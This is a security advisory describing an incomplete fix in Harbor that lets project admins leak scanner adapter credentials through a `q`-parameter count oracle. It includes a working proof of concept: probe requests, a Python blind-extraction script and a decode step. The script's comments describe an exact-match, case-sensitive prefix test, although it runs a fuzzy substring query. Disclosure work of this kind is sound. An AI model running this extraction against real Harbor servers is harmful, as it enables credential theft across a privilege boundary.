https://github.com/goharbor/harbor

## Finding: Incomplete fix for CVE-2025-30086 — scanner adapter access_cred leaks to project admins via the `q` parameter

Affected versions: <= v2.15.1

## Details


### Summary

Harbor's generic list APIs translate the `q` query parameter into ORM `WHERE` clauses. A field is filterable unless its struct definition carries the `filter:"false"` tag. CVE-2025-30086 (GHSA-h27m-3qw8-3pw8) was an ORM-leak where the `q` parameter let callers filter by sensitive columns (e.g. `password`) and reconstruct them character-by-character via a boolean oracle. The fix added `filter:"false"` to known credential columns.

That fix is incomplete. The scanner registration model `Registration.AccessCredential` (DB column `access_cred`) — which stores the scanner adapter's authentication secret (HTTP `Basic base64(user:pass)`, `Bearer <token>`, or the `X-ScannerAdapter-API-Key` value) — was **not** tagged `filter:"false"`. It is therefore still filterable through the `q` parameter.

Crucially this is reachable by a **project administrator** (a normal authenticated tenant who owns any single project), not just a system admin, via:

```
GET /api/v2.0/projects/{project_name_or_id}/scanner/candidates?q=access_cred=~<prefix>
```

The handler `ListScannerCandidatesOfProject` authorizes with `RequireProjectAccess(ctx, project, ActionCreate, ResourceScanner)` — a per-project `projectAdmin` permission. The response payload is built by `ScannerRegistration.ToSwagger`, which **omits** `AccessCredential` entirely, so a project admin is never supposed to see scanner credentials. But the `X-Total-Count` header (and whether a row is returned) reflects the server-side `q` filter, providing a boolean oracle that leaks the secret character-by-character. Scanner registrations are global, system-level configuration; a project admin extracting their adapter secret is a privilege boundary crossing.

### Details

Query building (`src/lib/q/builder.go`, `src/lib/orm/query.go`, `src/lib/orm/metadata.go`):
- `q=access_cred=~Basic` parses to key `access_cred`, operator fuzzy, value `Basic` (`builder.go` `parsePattern`/`parseFuzzyMatchValue`).
- `setFilters` (`query.go:200-202`) turns a fuzzy value into `qs.Filter("access_cred__icontains", ...)` (SQL `ILIKE`); exact `=` becomes `qs.Filter("access_cred", value)`.
- The only gate is `meta.Filterable(field)` (`query.go:165`), which returns true for any field that does **not** carry `filter:"false"` (`metadata.go:159-161`).

The incomplete fix (columns the maintainers DID blocklist vs the one they missed):
```
src/pkg/user/dao/user.go:35     Password        ... `filter:"false"`
src/pkg/user/dao/user.go:42     Salt            ... `filter:"false"`
src/pkg/robot/model/model.go:35 Secret          ... `filter:"false"`
src/pkg/robot/model/model.go:36 Salt            ... `filter:"false"`
src/pkg/reg/dao/model.go:33-34  AccessKey/AccessSecret ... `filter:"false"`
src/pkg/reg/dao/model.go:37     CACertificate   ... `filter:"false"`

src/pkg/scan/dao/scanner/model.go:51
    AccessCredential string `orm:"column(access_cred);null;size(512)" json:"access_credential,omitempty"`
    // ^^^ NO filter:"false" -> still filterable
```

Reachability by a project admin (not system admin):
- Handler `src/server/v2.0/handler/project.go` `ListScannerCandidatesOfProject`:
  - `RequireProjectAccess(ctx, projectNameOrID, rbac.ActionCreate, rbac.ResourceScanner)`
  - `query, _ := a.BuildQuery(ctx, params.Q, ...)` -> `a.scannerCtl.GetTotalOfRegistrations(ctx, query)` (sets `X-Total-Count`) and `ListRegistrations(ctx, query)`.
- `ResourceScanner + ActionCreate` is granted to `projectAdmin` only (`src/common/rbac/project/rbac_role.go`, projectAdmin block), so any tenant who is admin of a single project can call it.
- DAO: `src/pkg/scan/dao/scanner/registration.go`:
  - `GetTotalOfRegistrations` -> `orm.QuerySetterForCount(ctx, &Registration{}, query)` (drives `X-Total-Count`).
  - `ListRegistrations` -> `orm.QuerySetter(ctx, &Registration{}, query)`.
- Response serializer `src/server/v2.0/handler/model/scanner.go` `ToSwagger` returns `Auth` but NOT `AccessCredential` — confirming the credential is meant to be secret to this caller; the `q` filter is the side channel.

Because `GetTotalOfRegistrations` applies the same `q`, the secret is recoverable purely from `X-Total-Count` even though no row body is needed and the credential is never serialized.

### PoC

Self-contained, against Harbor v2.15.1.

Pre-req (one-time, by a system admin, normal product use): a scanner adapter is registered with an auth credential, e.g. a Trivy/Clair adapter behind Basic auth. Its `access_cred` is something like `Basic YWRtaW46U3VwM3JTM2NyZXQh`.

Attacker: any user who is **project administrator of at least one project** `myproj` (no system-admin rights). Authenticate as that user.

1. Confirm the oracle works (substring probe):
```
GET /api/v2.0/projects/myproj/scanner/candidates?q=access_cred=~Basic%20
-> 200, X-Total-Count: 1     (a credential beginning/containing "Basic " exists)

GET /api/v2.0/projects/myproj/scanner/candidates?q=access_cred=~ZZZ
-> 200, X-Total-Count: 0
```

2. Blind, character-by-character extraction using only `X-Total-Count` (pseudocode):
```python
import requests
BASE="https://harbor/api/v2.0/projects/myproj/scanner/candidates"
S=requests.Session(); S.auth=("projadmin","password")
ALPHA="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/= "
def count(qstr):
    r=S.get(BASE, params={"q":qstr}, verify=False)
    return int(r.headers.get("X-Total-Count","0"))
# exact-match oracle gives case-sensitive recovery; build the value char by char
known=""
while True:
    nxt=None
    for c in ALPHA:
        # confirm "known+c" is a prefix by requiring the full filtered set still matches
        if count("access_cred=~%s" % (known+c)) > 0:
            nxt=c; break
    if nxt is None: break
    known+=nxt
print("recovered access_cred:", known)   # e.g. "Basic YWRtaW46U3VwM3JTM2NyZXQh"
```

3. Decode the recovered credential to obtain the scanner adapter's plaintext secret:
```
$ echo YWRtaW46U3VwM3JTM2NyZXQh | base64 -d
admin:Sup3rS3cret!
```

In-process validation (verbatim source + pinned deps, Postgres) confirming the count oracle leaks the secret:
```
q=''                          -> count=1   (baseline)
q='access_cred=~ZZZ'          -> count=0   (wrong)
q='access_cred=~U3VwM3JTM2Ny' -> count=1   (correct secret substring)
q='access_cred=~U3VwM3JTXXXX' -> count=0   (near-miss)
q='access_cred=Basic YWRtaW46U3VwM3JTM2NyZXQh'  -> count=1  (exact)
q='access_cred=Basic YWRtaW46U3VwM3JTM2NyZXQhX' -> count=0
```

### Impact

A project administrator — a low-privilege role from the system's perspective, assignable to any tenant who owns a project — can exfiltrate the authentication credential of any globally registered scanner adapter, character by character, even though that credential is deliberately redacted from every API response the caller can read. The leaked secret (Basic/Bearer/API-key) authenticates to the scanner adapter service and may grant access to scan internals or be reused elsewhere. This is the same ORM-leak class as CVE-2025-30086, left reachable on a credential column the partial fix did not blocklist, and now reachable by a lower-privileged principal than the original `users` endpoint required.

### Suggested fix

Add `filter:"false"` to `AccessCredential` in `src/pkg/scan/dao/scanner/model.go` (matching the treatment of `reg.access_secret`, `robot.secret`, `user.password`). More robustly, switch the `q` filter from a per-column blocklist to an explicit per-model allowlist of filterable columns, so newly added sensitive columns are not exposed by default. Audit the remaining non-blocklisted sensitive columns (`oidc_user.token`, `oidc_user.subiss`, `user.reset_uuid`, `user.password_version`) for the same treatment.

### Disclosure
 - 20 June 2026 - reported via email
 - 17 August 2026 - no response, opened https://github.com/goharbor/harbor/security/advisories/GHSA-9c86-xf3m-pxvx
 - 14 September 2026 - no response, disclosed
